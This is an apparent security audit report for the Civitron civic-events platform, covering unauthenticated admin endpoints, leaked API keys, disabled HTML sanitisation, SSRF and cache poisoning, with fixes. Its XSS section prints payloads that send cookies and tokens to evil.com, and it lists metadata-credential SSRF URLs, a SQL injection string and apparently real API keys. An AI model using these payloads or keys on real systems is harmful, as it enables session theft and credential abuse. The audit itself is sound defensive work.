# Security Audit Report - Civitron Platform
**Date:** December 24, 2025  
**Severity Scale:** 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low | ℹ️ Info

---

## Executive Summary

This security audit identified **8 vulnerabilities** requiring immediate attention:
- 🔴 **1 Critical** - No authentication on admin/maintenance endpoints
- 🟠 **3 High** - API key exposure, SQL injection risk, disabled XSS protection
- 🟡 **4 Medium** - Puppeteer SSRF risks, no rate limiting, cache poisoning, dependency vulnerabilities

**Production Deployment Status:** ⚠️ **NOT READY** - Critical issues must be fixed first.

---

## 🔴 Critical Vulnerabilities

### 1. Unauthenticated Admin Endpoints
**Location:** `netlify/functions/admin-events.ts`, `netlify/functions/db-maintenance.ts`  
**CVSS Score:** 9.1 (Critical)  
**Risk:** Full database access without authentication

#### Evidence:
```typescript
// admin-events.ts - NO AUTH CHECK
export const handler: Handler = async (event, context) => {
  // Anyone can query the entire database
  const query = `SELECT * FROM events...`;
}

// db-maintenance.ts - Weak API key check
if (apiKey !== process.env.DB_MAINTENANCE_KEY) {
  return { statusCode: 401, body: JSON.stringify({ error: 'Unauthorized' }) };
}
```

#### Impact:
- **admin-events endpoint:** Public read access to all database records
- **db-maintenance endpoint:** 
  - Can reset entire database (`?action=reset`)
  - Can retag all events (`?action=retag`)
  - Protected only by `DB_MAINTENANCE_KEY` env var (not set in `.env`)

#### Attack Scenarios:
1. Attacker scrapes entire event database via `/.netlify/functions/admin-events`
2. Attacker monitors user search patterns by repeatedly querying with different filters
3. If `DB_MAINTENANCE_KEY` is not set in production, `?key=undefined` bypasses check
4. Attacker deletes all data with `?action=reset&key=<guessed_key>`

#### Recommended Fix:
```typescript
// Option 1: Remove from production entirely
if (process.env.NODE_ENV === 'production') {
  return { statusCode: 404, body: 'Not found' };
}

// Option 2: Implement proper authentication
import { verifyNetlifyIdentityToken } from './utils/auth';

export const handler: Handler = async (event, context) => {
  // Verify JWT token from Netlify Identity
  const user = await verifyNetlifyIdentityToken(event.headers.authorization);
  if (!user || !user.app_metadata?.roles?.includes('admin')) {
    return { statusCode: 403, body: 'Forbidden' };
  }
  // ... rest of handler
}

// Option 3: IP whitelist + secure API key
const ADMIN_IPS = process.env.ADMIN_IP_WHITELIST?.split(',') || [];
const clientIP = event.headers['client-ip'] || event.headers['x-forwarded-for'];

if (!ADMIN_IPS.includes(clientIP)) {
  return { statusCode: 403, body: 'IP not whitelisted' };
}

// Require 32+ character random key
if (!apiKey || apiKey.length < 32 || apiKey !== process.env.DB_MAINTENANCE_KEY) {
  return { statusCode: 401, body: 'Unauthorized' };
}
```

#### Priority: **IMMEDIATE** - Must fix before production deployment

---

## 🟠 High Vulnerabilities

### 2. Hardcoded API Keys in Source Code
**Location:** `netlify/functions/utils/scrapers/states/oregon.ts`  
**CVSS Score:** 7.5 (High)  
**Risk:** API key exposure, rate limit bypass, account takeover

#### Evidence:
```typescript
// oregon.ts line 21 - Hardcoded OpenStates API key as fallback
const OPENSTATE_API_KEY = process.env.OPENSTATES_API_KEY || 
                          process.env.VITE_OPENSTATES_API_KEY || 
                          'cd952883-5eee-42d3-a2d4-1d1210129f59'; // ❌ EXPOSED
```

#### Also Found in .env (committed to repo):
```env
CONGRESS_API_KEY=NMhq8kYMtMF15airPX13o33UIl8krU5Q6o0O01Se
OPENSTATES_API_KEY=28c40742-efad-4e35-b466-802f9eb38c99
```

#### Impact:
- Hardcoded key is visible in public GitHub repository
- Anyone can use these keys to exhaust rate limits
- OpenStates/Congress.gov may ban the account
- Attackers can access all state legislative data using your credentials

#### Attack Scenarios:
1. Attacker clones repo, extracts API keys
2. Attacker makes 10,000+ API calls, exhausting your rate limit
3. Your production scrapers fail due to 429 rate limit errors
4. OpenStates/Congress.gov bans your account for abuse

#### Recommended Fix:
```typescript
// 1. Remove hardcoded fallback immediately
const OPENSTATE_API_KEY = process.env.OPENSTATES_API_KEY;

if (!OPENSTATE_API_KEY) {
  throw new Error('OPENSTATES_API_KEY environment variable required');
}

// 2. Rotate compromised keys
// - Generate new OpenStates API key at https://open.pluralpolicy.com/accounts/profile/
// - Generate new Congress API key at https://api.congress.gov/sign-up/

// 3. Never commit .env file
// Add to .gitignore (already done, but verify)
echo ".env" >> .gitignore
git rm --cached .env  # Remove from git history

// 4. Check git history for leaks
git log --all --full-history -- .env
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty --tag-name-filter cat -- --all
```

#### Priority: **IMMEDIATE** - Rotate keys before any public deployment

---

### 3. SQL Injection Risk in Dynamic Queries
**Location:** `netlify/functions/admin-events.ts` (lines 28-75)  
**CVSS Score:** 8.2 (High)  
**Risk:** Database compromise, data exfiltration

#### Evidence:
```typescript
// admin-events.ts - Building WHERE clause dynamically
let whereConditions: string[] = [];
let queryParams: any[] = [];
let paramIndex = 1;

if (params.state) {
  whereConditions.push(`e.state_code = $${paramIndex}`);
  queryParams.push(params.state.toUpperCase());
  paramIndex++;
}
// ... more conditions

const whereClause = whereConditions.length > 0 
  ? `WHERE ${whereConditions.join(' AND ')}` 
  : '';

const query = `SELECT ... FROM events e ${whereClause}`;
```

#### Current Protection:
✅ Uses parameterized queries (`$1`, `$2`, etc.)  
✅ Values are properly escaped via `queryParams` array

#### Residual Risks:
⚠️ **Column name injection:** If future code allows dynamic column selection:
```typescript
// VULNERABLE - Don't add this!
if (params.sortBy) {
  query += ` ORDER BY ${params.sortBy}`; // ❌ Can inject SQL
}
```

⚠️ **Second-order injection:** User input stored in DB then used in dynamic SQL:
```typescript
// Scenario: Malicious event name like "; DROP TABLE events; --"
const eventName = dbResult.rows[0].name; // From untrusted source
await pool.query(`SELECT * FROM events WHERE name = '${eventName}'`); // ❌
```

#### Recommended Hardening:
```typescript
// 1. Whitelist allowed columns for sorting/filtering
const ALLOWED_SORT_COLUMNS = ['date', 'name', 'state_code', 'level'];
const ALLOWED_FILTER_COLUMNS = ['state', 'level', 'date', 'city'];

// 2. Validate before using in query
if (params.sortBy && !ALLOWED_SORT_COLUMNS.includes(params.sortBy)) {
  return { statusCode: 400, body: 'Invalid sort column' };
}

// 3. Use ORM or query builder
import { QueryBuilder } from 'pg-query-builder';
const query = new QueryBuilder()
  .select('*')
  .from('events')
  .where('state_code', params.state)
  .where('level', params.level)
  .build();

// 4. Add prepared statement comments
const query = `
  -- Safe: Uses parameterized queries throughout
  SELECT * FROM events WHERE state_code = $1 AND level = $2
`;
```

#### Priority: **HIGH** - Add column whitelisting before production

---

### 4. XSS Protection Disabled
**Location:** `netlify/functions/utils/security.ts`  
**CVSS Score:** 7.3 (High)  
**Risk:** Cross-site scripting attacks, session hijacking

#### Evidence:
```typescript
// security.ts lines 19-22
export function sanitizeHTML(html: string, options: SanitizeOptions = {}): string {
  // TEMPORARY: Skip sanitization in Node environment where DOMPurify doesn't work
  // TODO: Use a proper server-side HTML sanitizer like 'sanitize-html' package
  return html; // ❌ NO SANITIZATION
}
```

#### Impact:
- Malicious HTML/JavaScript from scraped government sites executes in user browsers
- If attacker compromises a state legislature website, they can inject:
  - `<script>fetch('https://evil.com/?cookie='+document.cookie)</script>`
  - `<img src=x onerror="alert(document.cookie)">`
  - `<a href="javascript:void(fetch('https://evil.com/steal?data='+localStorage.getItem('token')))">Click here</a>`

#### Attack Scenarios:
1. Attacker gains access to state legislature CMS (not uncommon - government sites often poorly secured)
2. Attacker injects malicious script into meeting description
3. Civitron scraper fetches malicious content
4. All users viewing that meeting have their sessions hijacked

#### Recommended Fix:
```typescript
// 1. Install server-side HTML sanitizer
npm install sanitize-html @types/sanitize-html

// 2. Replace DOMPurify with sanitize-html
import sanitizeHtml from 'sanitize-html';

export function sanitizeHTML(html: string, options: SanitizeOptions = {}): string {
  const {
    allowLinks = true,
    allowFormatting = true,
    stripAll = false
  } = options;

  if (stripAll) {
    return sanitizeHtml(html, { allowedTags: [], allowedAttributes: {} });
  }

  const allowedTags = ['p', 'br', 'strong', 'em', 'u', 'b', 'i'];
  const allowedAttributes: Record<string, string[]> = {};
  
  if (allowLinks) {
    allowedTags.push('a');
    allowedAttributes['a'] = ['href', 'title'];
  }

  return sanitizeHtml(html, {
    allowedTags,
    allowedAttributes,
    allowedSchemes: ['http', 'https'], // Block javascript:, data:, etc.
    allowedSchemesByTag: {
      a: ['http', 'https']
    },
    disallowedTagsMode: 'discard',
    enforceHtmlBoundary: true
  });
}

// 3. Add Content Security Policy headers to all endpoints
export const handler: Handler = async (event) => {
  const headers = {
    'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'",
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    // ... other headers
  };
  // ... rest of handler
};
```

#### Priority: **HIGH** - Implement before scraping untrusted government sites

---

## 🟡 Medium Vulnerabilities

### 5. Puppeteer SSRF (Server-Side Request Forgery)
**Location:** All Puppeteer scrapers (42 state scrapers)  
**CVSS Score:** 5.8 (Medium)  
**Risk:** Internal network scanning, localhost attacks

#### Evidence:
```typescript
// puppeteer-helper.ts - Navigates to any URL without validation
export async function fetchWithBrowser(url: string): Promise<string> {
  const page = await createPage();
  await page.goto(url, { // ❌ No URL validation
    waitUntil: 'networkidle0',
    timeout: 60000
  });
  return await page.content();
}

// scrapers can pass any URL
const html = await fetchWithBrowser(someUrl); // If someUrl is user-controlled = SSRF
```

#### Impact:
- If URL parameter becomes user-controlled (e.g., custom scraper feature):
  - Attacker can scan internal network: `http://localhost:5432` (PostgreSQL)
  - Read AWS metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - Access other Netlify functions: `http://localhost:8888/.netlify/functions/admin-events`

#### Current Mitigation:
✅ All scraper URLs are hardcoded (not user-controlled)  
✅ Scrapers only fetch from whitelisted government domains

#### Recommended Hardening:
```typescript
// 1. Add URL validation utility
export function isAllowedScraperUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    
    // Block localhost/private IPs
    const privateIPs = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'];
    if (privateIPs.some(ip => parsed.hostname.includes(ip))) {
      return false;
    }
    
    // Block private IP ranges
    if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(parsed.hostname)) {
      return false;
    }
    
    // Only allow http/https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return false;
    }
    
    // Whitelist government domains
    const allowedDomains = [
      '.gov', '.state.us', '.ca.us', '.ny.us', // State/federal sites
      'legistar.com' // Legistar API
    ];
    
    const isWhitelisted = allowedDomains.some(domain => 
      parsed.hostname.endsWith(domain)
    );
    
    return isWhitelisted;
  } catch {
    return false;
  }
}

// 2. Enforce in Puppeteer helper
export async function fetchWithBrowser(url: string): Promise<string> {
  if (!isAllowedScraperUrl(url)) {
    throw new Error(`URL not allowed for scraping: ${url}`);
  }
  
  const page = await createPage();
  
  // Set extra defense - block requests to private IPs
  await page.setRequestInterception(true);
  page.on('request', (request) => {
    const reqUrl = request.url();
    if (!isAllowedScraperUrl(reqUrl)) {
      console.warn(`⚠️ Blocked request to: ${reqUrl}`);
      request.abort();
    } else {
      request.continue();
    }
  });
  
  await page.goto(url, { waitUntil: 'networkidle0', timeout: 60000 });
  return await page.content();
}
```

#### Priority: **MEDIUM** - Add before allowing user-submitted URLs

---

### 6. No Global Rate Limiting
**Location:** All API endpoints  
**CVSS Score:** 5.3 (Medium)  
**Risk:** API abuse, resource exhaustion, increased hosting costs

#### Evidence:
```typescript
// state-events.ts, local-meetings.ts, etc. - No rate limiting
export const handler: Handler = async (event) => {
  // Anyone can call this endpoint unlimited times
  const events = await fetchEvents();
  return { statusCode: 200, body: JSON.stringify(events) };
};
```

#### Current Protection:
✅ **Scraper rate limits:** Each scraper has `maxRequestsPerMinute: 20-60`  
✅ **Cache protection:** 24-hour cache reduces backend load by 99%

#### Remaining Gaps:
❌ **No per-user/IP rate limits:** Single user can make 1000+ requests/minute to different cities  
❌ **No global rate limit:** 10,000 users × 10 req/min = 100,000 req/min → expensive  
❌ **No burst protection:** Attacker can exhaust database connections instantly

#### Recommended Fix:
```typescript
// 1. Install rate limiter
npm install @netlify/functions-rate-limit

// 2. Add to each endpoint
import { rateLimit } from '@netlify/functions-rate-limit';

export const handler: Handler = rateLimit({
  windowMs: 60 * 1000, // 1 minute window
  maxRequests: 30, // 30 requests per IP per minute
  identifyUser: (event) => {
    // Use IP + user agent to prevent simple bypass
    const ip = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'unknown';
    const ua = event.headers['user-agent'] || 'unknown';
    return `${ip}:${ua.slice(0, 50)}`;
  },
  onRateLimit: (event) => {
    console.warn(`⚠️ Rate limit exceeded for ${event.headers['client-ip']}`);
    return {
      statusCode: 429,
      body: JSON.stringify({ 
        error: 'Rate limit exceeded',
        message: 'Too many requests. Please try again later.',
        retryAfter: 60 
      })
    };
  }
}, async (event, context) => {
  // Original handler code
  const events = await fetchEvents();
  return { statusCode: 200, body: JSON.stringify(events) };
});

// 3. Add Netlify Edge rate limiting (production)
// netlify.toml
[[edge_functions]]
  function = "rate-limiter"
  path = "/.netlify/functions/*"

// netlify/edge-functions/rate-limiter.ts
export default async (request: Request, context: any) => {
  const rateLimitKey = context.ip || 'unknown';
  const { success, limit, remaining, reset } = await context.rateLimit({
    key: rateLimitKey,
    limit: 100, // 100 requests per...
    window: "1m" // 1 minute
  });
  
  if (!success) {
    return new Response(JSON.stringify({ error: 'Rate limit exceeded' }), {
      status: 429,
      headers: {
        'X-RateLimit-Limit': String(limit),
        'X-RateLimit-Remaining': String(remaining),
        'X-RateLimit-Reset': String(reset)
      }
    });
  }
  
  return context.next();
};
```

#### Priority: **MEDIUM** - Add before public launch

---

### 7. Cache Poisoning Vulnerability
**Location:** `netlify/functions/utils/scrapers/cache-manager.ts`  
**CVSS Score:** 4.8 (Medium)  
**Risk:** Serving malicious data to all users

#### Evidence:
```typescript
// cache-manager.ts - File-based cache without integrity checks
export class CacheManager {
  static set(key: string, data: any, ttl: number = 3600): void {
    const filePath = path.join(this.cacheDir, this.sanitizeKey(key) + '.json');
    const cacheData = {
      data,
      expires: Date.now() + ttl * 1000
    };
    fs.writeFileSync(filePath, JSON.stringify(cacheData)); // ❌ No integrity check
  }
  
  static get(key: string): any | null {
    const filePath = path.join(this.cacheDir, this.sanitizeKey(key) + '.json');
    const cacheData = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
    return cacheData.data; // ❌ Trusts cached data blindly
  }
}
```

#### Impact:
- If attacker gains write access to cache directory (via separate vulnerability):
  - Modify cached Legistar results for all users
  - Inject malicious meeting data (e.g., "Free concert at State Capitol - Bring ID")
  - Redirect users to phishing sites via modified `detailsUrl`

#### Attack Scenarios:
1. Attacker exploits path traversal in unrelated endpoint to write to `/tmp/civitron-cache/`
2. Attacker overwrites `local:legistar:atlanta:events.json` with malicious data
3. All users requesting Atlanta meetings for next 24 hours receive poisoned data

#### Recommended Fix:
```typescript
// 1. Add HMAC integrity check
import crypto from 'crypto';

export class CacheManager {
  private static readonly CACHE_SECRET = process.env.CACHE_HMAC_SECRET || 'change-me-in-production';
  
  private static sign(data: string): string {
    return crypto.createHmac('sha256', this.CACHE_SECRET).update(data).digest('hex');
  }
  
  static set(key: string, data: any, ttl: number = 3600): void {
    const filePath = path.join(this.cacheDir, this.sanitizeKey(key) + '.json');
    const dataStr = JSON.stringify(data);
    const cacheData = {
      data: dataStr,
      expires: Date.now() + ttl * 1000,
      signature: this.sign(dataStr) // Add HMAC
    };
    fs.writeFileSync(filePath, JSON.stringify(cacheData));
  }
  
  static get(key: string): any | null {
    const filePath = path.join(this.cacheDir, this.sanitizeKey(key) + '.json');
    const cacheData = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
    
    // Verify integrity
    const expectedSignature = this.sign(cacheData.data);
    if (cacheData.signature !== expectedSignature) {
      console.error(`⚠️ Cache integrity check failed for key: ${key}`);
      fs.unlinkSync(filePath); // Delete corrupted cache
      return null;
    }
    
    return JSON.parse(cacheData.data);
  }
}

// 2. Or migrate to Redis with built-in security
npm install @upstash/redis

import { Redis } from '@upstash/redis';
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_URL,
  token: process.env.UPSTASH_REDIS_TOKEN
});

static async set(key: string, data: any, ttl: number = 3600): Promise<void> {
  await redis.set(key, JSON.stringify(data), { ex: ttl });
}
```

#### Priority: **MEDIUM** - Add integrity checks before production

---

### 8. Outdated Dependencies with Known CVEs
**Location:** `package.json`  
**CVSS Score:** 5.9 (Medium)  
**Risk:** Multiple exploit vectors from 26 vulnerable packages

#### npm audit Results:
- **4 High severity:** jws, glob, tar-fs, node-forge
- **16 Moderate severity:** esbuild, netlify-cli, vite, @octokit/* packages
- **6 Low severity:** brace-expansion, tmp, on-headers

#### Critical Dependencies to Update:
```json
{
  "vulnerabilities": {
    "jws": {
      "severity": "high",
      "title": "Improperly Verifies HMAC Signature",
      "cvss": 7.5,
      "fixAvailable": true
    },
    "esbuild": {
      "severity": "moderate",
      "title": "Development server SSRF vulnerability",
      "cvss": 5.3,
      "affectedVersions": "<=0.24.2"
    },
    "netlify-cli": {
      "severity": "moderate",
      "affects": "17.10.1",
      "fixVersion": "23.13.0"
    },
    "vite": {
      "severity": "moderate",
      "affects": "5.0.8",
      "fixVersion": "7.3.0"
    }
  }
}
```

#### Recommended Fix:
```bash
# 1. Update all dependencies
npm update

# 2. Manually update major version breaking changes
npm install netlify-cli@23.13.0 --save-dev
npm install vite@7.3.0 --save-dev

# 3. Verify fixes
npm audit --production

# 4. Set up automated dependency scanning
# Add to .github/workflows/security.yml:
name: Security Scan
on:
  schedule:
    - cron: '0 0 * * 0' # Weekly on Sunday
  push:
    branches: [main]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm audit --production
      - run: npm audit fix --dry-run
```

#### Priority: **MEDIUM** - Update within 30 days

---

## ℹ️ Informational Findings

### 9. PostgreSQL Credentials in .env
**Location:** `.env` file  
**Risk:** Low (already in `.gitignore`)

Current credentials:
```env
POSTGRES_HOST=localhost
POSTGRES_PORT=5432
POSTGRES_DB=civitron
POSTGRES_USER=postgres
POSTGRES_PASSWORD=password  # ⚠️ Weak password for production
```

**Recommendation:** Use strong password in production, store in Netlify Environment Variables.

---

### 10. Scraper Rate Limiting Best Practices
**Status:** ✅ **WELL IMPLEMENTED**

All scrapers respect rate limits:
```typescript
config: ScraperConfig = {
  maxRequestsPerMinute: 20-60, // Per scraper
  respectRobotsTxt: true,
  userAgent: 'CivitronBot (+https://civitron.app)'
};
```

**Commendation:** Excellent citizenship - won't get IP banned by government sites.

---

## Summary of Recommended Actions

### Immediate (Before Production):
1. **Fix admin endpoint auth** - Add Netlify Identity or remove endpoints
2. **Rotate API keys** - Hardcoded OpenStates/Congress keys are exposed
3. **Enable XSS protection** - Install `sanitize-html` package
4. **Add rate limiting** - Prevent API abuse

### Within 30 Days:
5. **Update dependencies** - Fix 26 vulnerable packages
6. **Add cache integrity** - HMAC signatures or migrate to Redis
7. **Harden Puppeteer** - URL validation and SSRF protection

### Optional Improvements:
8. **Add logging/monitoring** - Track suspicious activity
9. **Implement CSP headers** - Defense-in-depth against XSS
10. **Set up automated security scanning** - GitHub Actions workflow

---

## Risk Assessment

**Overall Risk Level:** 🟠 **HIGH** (not production-ready)

**Deployment Recommendation:** 
- ⛔ **Do NOT deploy to production** until Critical + High issues are fixed
- ✅ Safe for local development and testing
- ⚠️ If deploying to staging, restrict access with HTTP Basic Auth

**Estimated Fix Time:** 8-16 hours for Critical + High issues

---

## Compliance Notes

- **GDPR:** No personal data collected (location queries are anonymous)
- **CCPA:** No California consumer data stored
- **Accessibility:** Not reviewed (out of scope for security audit)
- **PCI DSS:** N/A (no payment processing)

---

**Auditor Notes:**  
This platform handles public civic data (meeting schedules, legislation) with no user accounts or sensitive data. The main security concerns are protecting infrastructure (admin endpoints, database) and preventing abuse (rate limiting, XSS). Overall architecture is sound - issues are fixable with targeted changes.
